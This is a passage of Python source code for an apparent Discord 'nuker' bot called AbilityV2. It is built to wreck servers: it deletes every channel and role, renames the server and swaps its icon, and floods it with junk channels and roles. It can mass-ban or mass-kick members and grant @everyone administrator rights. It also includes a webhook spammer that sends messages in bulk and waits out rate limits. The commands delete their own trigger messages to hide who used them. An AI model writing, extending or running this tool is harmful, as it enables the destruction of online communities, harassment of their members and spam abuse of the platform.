            log(f"BG {cmd_name.upper()} COMPLETE in {elapsed:.2f}s", "ok")
        except asyncio.CancelledError:
            log("Nuke task cancelled mid-execution.", "err")
        except Exception as e:
            log(f"Nuke error: {e}", "err")
        finally:
            NUKE_RUNNING = False
            NUKE_TASK = None

    NUKE_TASK = asyncio.create_task(_nuke_task())


async def webhook_nuke():
    """Nuke a webhook - asks for URL each time, spams it to death."""
    def read_url():
        return input(f"{Fore.MAGENTA}  Webhook URL > {Fore.RESET}").strip()

    url = await asyncio.get_event_loop().run_in_executor(None, read_url)
    if not url or "discord.com/api/webhooks/" not in url:
        log("Invalid webhook URL.", "err")
        return

    def read_msg():
        return input(f"{Fore.MAGENTA}  Spam message (enter for default) > {Fore.RESET}").strip()

    msg = await asyncio.get_event_loop().run_in_executor(None, read_msg)
    if not msg:
        msg = random.choice(SPAM_MESSAGES)

    def read_count():
        try:
            return int(input(f"{Fore.MAGENTA}  How many messages? > {Fore.RESET}").strip())
        except ValueError:
            return 50

    count = await asyncio.get_event_loop().run_in_executor(None, read_count)

    log(f"WEBHOOK NUKE: {count} messages to webhook", "warn")
    session = await get_http()
    sent = 0
    errors = 0
    for i in range(count):
        try:
            async with session.post(url, json={"content": msg, "username": "AbilityV2"}) as resp:
                if resp.status == 429:
                    retry = float(resp.headers.get("Retry-After", 2))
                    await asyncio.sleep(retry)
                elif resp.status in (200, 204):
                    sent += 1
                else:
                    errors += 1
        except Exception:
            errors += 1
        await asyncio.sleep(0.01)

    log(f"Webhook nuke done: {sent} sent, {errors} errors", "ok")


async def execute_on_guild(cmd_name, server_id=None):
    """Execute a command on a specific server or the first available."""
    guild = None
    if server_id:
        g = bot.get_guild(int(server_id))
        if g:
            guild = g
        else:
            log(f"Server with ID {server_id} not found.", "err")
            return
    else:
        guild = await select_guild()
        if guild is None:
            return

    log("A man with potential is cooking", "warn")
    t0 = time.time()

    if cmd_name == "nuke":
        log(f"NUKE STARTED on {guild.name} ({guild.id})", "warn")

        # Delete all channels
        log("Deleting channels...", "cyan")
        await mass_exec(list(guild.channels), _del, "Channels")

        # Delete all roles except @everyone
        log("Deleting roles...", "cyan")
        roles = [r for r in guild.roles if r.name != "@everyone" and r < guild.me.top_role]
        await mass_exec(roles, _del, "Roles")

        # Edit server name, description, icon
        log("Editing server...", "cyan")
        try:
            await guild.edit(name=SERVER_NAME, description=SERVER_DESC)
        except Exception:
            pass
        try:
            if SERVER_ICON:
                async with aiohttp.ClientSession() as sess:
                    async with sess.get(SERVER_ICON) as resp:
                        if resp.status == 200:
                            icon_bytes = await resp.read()
                            await guild.edit(icon=icon_bytes)
                            log("Server icon changed.", "ok")
        except Exception as e:
            log(f"Could not change icon: {e}", "err")

        # Create new channels (parallel)
        log(f"Creating {CHANNELS_TO_CREATE} channels...", "cyan")
        chan_tasks = [guild.create_text_channel(name=random.choice(CHANNEL_NAMES)) for _ in range(CHANNELS_TO_CREATE)]
        await asyncio.gather(*chan_tasks, return_exceptions=True)

        # Create roles
        log(f"Creating {ROLES_TO_CREATE} roles...", "cyan")
        role_tasks = [guild.create_role(name=random.choice(ROLE_NAMES), color=rand_color()) for _ in range(ROLES_TO_CREATE)]
        await asyncio.gather(*role_tasks, return_exceptions=True)

        elapsed = time.time() - t0
        log(f"NUKE COMPLETE in {elapsed:.2f}s", "ok")

    elif cmd_name == "quicknuke":
        log(f"QUICKNUKE on {guild.name}", "warn")
        await mass_exec(list(guild.channels), _del, "Channels")
        roles = [r for r in guild.roles if r.name != "@everyone" and r < guild.me.top_role]
        await mass_exec(roles, _del, "Roles")
        elapsed = time.time() - t0
        log(f"QUICKNUKE done in {elapsed:.2f}s", "ok")

    elif cmd_name == "delchannels":
        await mass_exec(list(guild.channels), _del, "Channels")

    elif cmd_name == "delroles":
        roles = [r for r in guild.roles if r.name != "@everyone" and r < guild.me.top_role]
        await mass_exec(roles, _del, "Roles")

    elif cmd_name == "massban":
        targets = [m for m in guild.members if m != guild.owner and m != bot.user and m.top_role < guild.me.top_role]
        async def _ban(m):
            try:
                await m.ban(reason="AbilityV2 | Baahwei")
            except Exception:
                pass
        await mass_exec(targets, _ban, "Bans")

    elif cmd_name == "masskick":
        targets = [m for m in guild.members if m != guild.owner and m != bot.user and m.top_role < guild.me.top_role]
        async def _kick(m):
            try:
                await m.kick(reason="AbilityV2 | Baahwei")
            except Exception:
                pass
        await mass_exec(targets, _kick, "Kicks")

    elif cmd_name == "adminall":
        try:
            await guild.default_role.edit(
                permissions=discord.Permissions(administrator=True),
                reason="AbilityV2 | Baahwei",
            )
            log(f"Gave @everyone Administrator in {guild.name}!", "ok")
        except Exception as e:
            log(f"Failed: {e}", "err")

    elif cmd_name == "serverinfo":
        log(f"Server: {guild.name} | ID: {guild.id} | Owner: {guild.owner} | Members: {guild.member_count} | Channels: {len(guild.channels)} | Roles: {len(guild.roles)}", "cyan")


# ============================================================
# DISCORD COMMANDS (for in-server usage too)
# ============================================================
@bot.command(name="help", aliases=["h", "cmds"])
async def help_cmd(ctx):
    await ctx.message.delete()
    embed = discord.Embed(
        title="AbilityV2 - Commands",
        description="Made by Baahwei",
        color=discord.Color.purple(),
        timestamp=datetime.utcnow(),
    )
    embed.set_author(name="AbilityV2 | Baahwei")
    embed.add_field(name=f"`{BOT_PREFIX}help`", value="This menu", inline=False)
    embed.add_field(name=f"`{BOT_PREFIX}serverinfo`", value="Server info", inline=False)
    embed.add_field(name="-" * 25, value="**ADMIN COMMANDS**", inline=False)
    embed.add_field(name=f"`{BOT_PREFIX}nuke`", value="Full nuke: delete channels, recreate, spam, change icon", inline=False)
    embed.add_field(name=f"`{BOT_PREFIX}quicknuke`", value="Delete channels + roles only", inline=False)
    embed.add_field(name=f"`{BOT_PREFIX}delchannels`", value="Delete all channels", inline=False)
    embed.add_field(name=f"`{BOT_PREFIX}delroles`", value="Delete all roles", inline=False)
    embed.add_field(name=f"`{BOT_PREFIX}massban`", value="Ban all members", inline=False)
    embed.add_field(name=f"`{BOT_PREFIX}masskick`", value="Kick all members", inline=False)
    embed.add_field(name=f"`{BOT_PREFIX}adminall`", value="Give @everyone Admin", inline=False)
    embed.add_field(name=f"`{BOT_PREFIX}spamwebhook`", value="Start external webhook spammer", inline=False)
    embed.add_field(name=f"`{BOT_PREFIX}stopwebhook`", value="Stop external webhook spammer", inline=False)
    embed.add_field(name=f"`{BOT_PREFIX}webhookstats`", value="Webhook spam stats", inline=False)
    embed.add_field(name=f"`{BOT_PREFIX}shutdown`", value="Shut down", inline=False)
    embed.set_footer(text="AbilityV2 | Made by Baahwei")
    await ctx.send(embed=embed)


@bot.command(name="serverinfo", aliases=["si", "info"])
async def serverinfo_cmd(ctx):
    await ctx.message.delete()
    g = ctx.guild
    fmt = "%A, %d %B %Y | %I:%M %p UTC"
    desc = (
        f"**Members:** {g.member_count}\n"
        f"**Roles:** {len(g.roles)}\n"
        f"**Text:** {len(g.text_channels)} | **Voice:** {len(g.voice_channels)}\n"
        f"**Categories:** {len(g.categories)}\n"
        f"**Boosts:** {g.premium_subscription_count} (Tier {g.premium_tier})"
    )
    embed = discord.Embed(
        title=g.name,
        description=desc,
        color=discord.Color.purple(),
        timestamp=datetime.utcnow(),
    )
    embed.add_field(name="Server ID", value=str(g.id), inline=True)
    embed.add_field(name="Owner", value=str(g.owner), inline=True)
    embed.add_field(name="Created", value=g.created_at.strftime(fmt), inline=True)
    if g.icon:
        embed.set_thumbnail(url=g.icon.url)
    embed.set_footer(text="AbilityV2 | Made by Baahwei")
    await ctx.send(embed=embed)


@bot.command(name="nuke", aliases=["destroy", "obliterate"])
@commands.has_permissions(administrator=True)
async def nuke_cmd(ctx):
    await ctx.message.delete()
    t0 = time.time()
    g = ctx.guild
    log(f"NUKE (command) -> {g.name}", "warn")

    await mass_exec(list(g.channels), _del, "Channels")
    roles = [r for r in g.roles if r.name != "@everyone" and r < g.me.top_role]
    await mass_exec(roles, _del, "Roles")

    try:
        await g.edit(name=SERVER_NAME, description=SERVER_DESC)
    except Exception:
        pass
    try:
        if SERVER_ICON:
            async with aiohttp.ClientSession() as sess:
                async with sess.get(SERVER_ICON) as resp:
                    if resp.status == 200:
                        await g.edit(icon=await resp.read())
    except Exception:
        pass

    chan_tasks = [g.create_text_channel(name=random.choice(CHANNEL_NAMES)) for _ in range(CHANNELS_TO_CREATE)]
    role_tasks = [g.create_role(name=random.choice(ROLE_NAMES), color=rand_color()) for _ in range(ROLES_TO_CREATE)]
    await asyncio.gather(
        asyncio.gather(*chan_tasks, return_exceptions=True),
        asyncio.gather(*role_tasks, return_exceptions=True),
        return_exceptions=True,
    )

    elapsed = time.time() - t0
    log(f"NUKE done in {elapsed:.2f}s", "ok")


@bot.command(name="quicknuke", aliases=["qnuke"])
@commands.has_permissions(administrator=True)
async def quicknuke_cmd(ctx):
    await ctx.message.delete()
    g = ctx.guild
    t0 = time.time()
    log(f"QUICKNUKE -> {g.name}", "warn")
    await mass_exec(list(g.channels), _del, "Channels")
    roles = [r for r in g.roles if r.name != "@everyone" and r < g.me.top_role]
    await mass_exec(roles, _del, "Roles")
    elapsed = time.time() - t0
    log(f"QUICKNUKE done in {elapsed:.2f}s", "ok")


@bot.command(name="delchannels", aliases=["delchannel", "dc"])
@commands.has_permissions(administrator=True)
async def delchannels_cmd(ctx):
    await ctx.message.delete()
    await mass_exec(list(ctx.guild.channels), _del, "Channels")


@bot.command(name="delroles", aliases=["deleteroles", "dr"])
@commands.has_permissions(administrator=True)
async def delroles_cmd(ctx):
    await ctx.message.delete()
    roles = [r for r in ctx.guild.roles if r.name != "@everyone" and r < ctx.guild.me.top_role]
    await mass_exec(roles, _del, "Roles")


@bot.command(name="massban", aliases=["banall", "mb"])
@commands.has_permissions(administrator=True)
async def massban_cmd(ctx):
    await ctx.message.delete()
    targets = [m for m in ctx.guild.members if m != ctx.guild.owner and m != bot.user and m.top_role < ctx.guild.me.top_role]

    async def _ban(m):
        try:
            await m.ban(reason="AbilityV2 | Baahwei")
        except Exception:
            pass
    await mass_exec(targets, _ban, "Bans")


@bot.command(name="masskick", aliases=["kickall", "mk"])
@commands.has_permissions(administrator=True)
async def masskick_cmd(ctx):
    await ctx.message.delete()
    targets = [m for m in ctx.guild.members if m != ctx.guild.owner and m != bot.user and m.top_role < ctx.guild.me.top_role]

    async def _kick(m):
        try:
            await m.kick(reason="AbilityV2 | Baahwei")
        except Exception:
            pass
    await mass_exec(targets, _kick, "Kicks")


@bot.command(name="adminall", aliases=["giveadmin", "aa"])
@commands.has_permissions(administrator=True)
async def adminall_cmd(ctx):
    await ctx.message.delete()
    try:
        await ctx.guild.default_role.edit(
            permissions=discord.Permissions(administrator=True),
            reason="AbilityV2 | Baahwei",
        )
        log(f"Gave @everyone Admin in {ctx.guild.name}!", "ok")
    except Exception as e:
        log(f"Failed: {e}", "err")


@bot.command(name="spamwebhook", aliases=["sw", "startspam"])
async def spamwebhook_cmd(ctx, *, url=None):
    await ctx.message.delete()
    if url:
        WH_URLS.append(url)
        if wh_spammer:
            wh_spammer.urls.append(url)
        log(f"Webhook added ({len(WH_URLS)} total)", "ok")

    if not WH_URLS:
        await ctx.send("No webhook URLs configured.", delete_after=4)
        return

    if wh_spammer and wh_spammer.running:
        s = wh_spammer.stats_dict()
        await ctx.send(f"Already running | {s['sent']} sent | {s['rate']:.1f}/s", delete_after=4)
    else:
        if wh_spammer:
            wh_spammer.start(bot.loop)
        await ctx.send(f"Webhook spammer started [{len(WH_URLS)} URLs]", delete_after=3)


@bot.command(name="stopwebhook", aliases=["stopspam", "ss"])
async def stopwebhook_cmd(ctx):
    await ctx.message.delete()
    if wh_spammer and wh_spammer.running:
        wh_spammer.stop()
        await ctx.send("Webhook spammer stopped.", delete_after=3)
    else:
        await ctx.send("Not running.", delete_after=3)


@bot.command(name="webhookstats", aliases=["ws"])
async def webhookstats_cmd(ctx):
    await ctx.message.delete()
    if not wh_spammer:
        await ctx.send("Spammer not initialized.", delete_after=4)
        return
    s = wh_spammer.stats_dict()
    embed = discord.Embed(title="Webhook Spammer Stats", color=discord.Color.purple(), timestamp=datetime.utcnow())
    embed.add_field(name="Status", value="Running" if wh_spammer.running else "Stopped", inline=True)
    embed.add_field(name="URLs", value=str(len(WH_URLS)), inline=True)
    embed.add_field(name="Sent", value=str(s["sent"]), inline=True)
    embed.add_field(name="Errors", value=str(s["errors"]), inline=True)
    embed.add_field(name="Elapsed", value=f"{s['elapsed']:.1f}s", inline=True)
    embed.add_field(name="Rate", value=f"{s['rate']:.1f} msg/s", inline=True)
    embed.set_footer(text="AbilityV2 | Made by Baahwei")
    await ctx.send(embed=embed)


@bot.command(name="shutdown", aliases=["die", "stop", "off"])
async def shutdown_cmd(ctx):
    await ctx.message.delete()
    if wh_spammer:
        wh_spammer.stop()
    log("Shutting down...", "warn")
    await bot.close()


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Administrator permission required.", delete_after=4)
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        log(f"Error: {error}", "err")


# ============================================================
# MAIN
# ============================================================
def main():
    global CFG_NAME, bot

    # Select config
    CFG_NAME, cfg_data = select_config()
    if cfg_data is None:
        log("Failed to load config.", "err")
        input("Press Enter to exit...")
        sys.exit(1)

    apply_config(cfg_data)

    has_token = BOT_TOKEN and BOT_TOKEN != "YOUR_BOT_TOKEN_HERE"
    if not has_token:
        print_banner()
        log("No valid bot token found in config!", "err")
        log(f"Edit configs/{CFG_NAME}.json and set bot.token", "info")
        input("\nPress Enter to exit...")
        sys.exit(1)

    log(f"Loading config: {CFG_NAME}.json", "magenta")
    log(f"Prefix: {BOT_PREFIX} | Status: {BOT_STATUS} | Speed: {MSG_PER_SEC} msg/s", "cyan")
    log("Connecting to Discord...", "cyan")

    # Update prefix on the existing module-level bot (commands already bound via decorators)
    bot.command_prefix = BOT_PREFIX

    bot.run(BOT_TOKEN, log_handler=None)


if __name__ == "__main__":
    main()